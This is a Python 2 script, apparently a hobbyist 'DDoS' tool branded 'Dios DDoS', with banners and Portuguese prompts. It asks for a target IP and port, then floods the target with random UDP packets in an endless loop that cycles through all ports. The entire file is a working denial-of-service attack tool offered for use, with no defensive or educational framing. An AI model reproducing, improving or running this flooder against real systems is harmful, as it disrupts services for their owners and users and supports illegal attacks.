#codder/diosddos

import sys
import os
import socket
import random
#configdate
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
#configsocket
sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#logo

os.system("clear")

print "     _ _                 _     _"
print "  __| (_) ___  ___    __| | __| | ___  ___"
print " / _` | |/ _ \/ __|  / _` |/ _` |/ _ \/ __|"
print "| (_| | | (_) \__ \ | (_| | (_| | (_) \__ /"
print " \__,_|_|\___/|___/  \__,_|\__,_|\___/|___/"
print "  https://github.com/DiosDeLaWeb/Dios-DDos"
print
print "codder by: dios de la web   #dono do script"
print "new team 404                #melhor team hacker"
print "dios ddos attack on         #teste sites"
print "use comando ping            #como pegar ip"
print "insira o ip alvo abaixo     #dica dios"
print "logo depois coloque o port  #port sugerido (80)"
print

ip = raw_input("IP Alvo :")
port = input("Port       :")

os.system("clear")

print "     _     _"
print "  __| | __| | ___  ___    __ _  ___"
print " / _` |/ _` |/ _ \/ __|  / _` |/ _ |"
print "| (_| | (_| | (_) \__ \ | (_| | (_) |"
print " \__,_|\__,_|\___/|___/  \__, |\___/"
print "                         |___/"
print
print "[                    ] 0%"
print "[=====               ] 25%" 
print "[==========          ] 50%" 
print "[===============     ] 75%"
print "[====================] 100%" 
sent = 0
while True:
    sock.sendto(bytes,(ip,port))
    sent = sent + 1
    port = port + 1
    print "Sent %s packet to %s throught port:%s" % (sent,ip,port)
    if port == 65534:
        port = 1
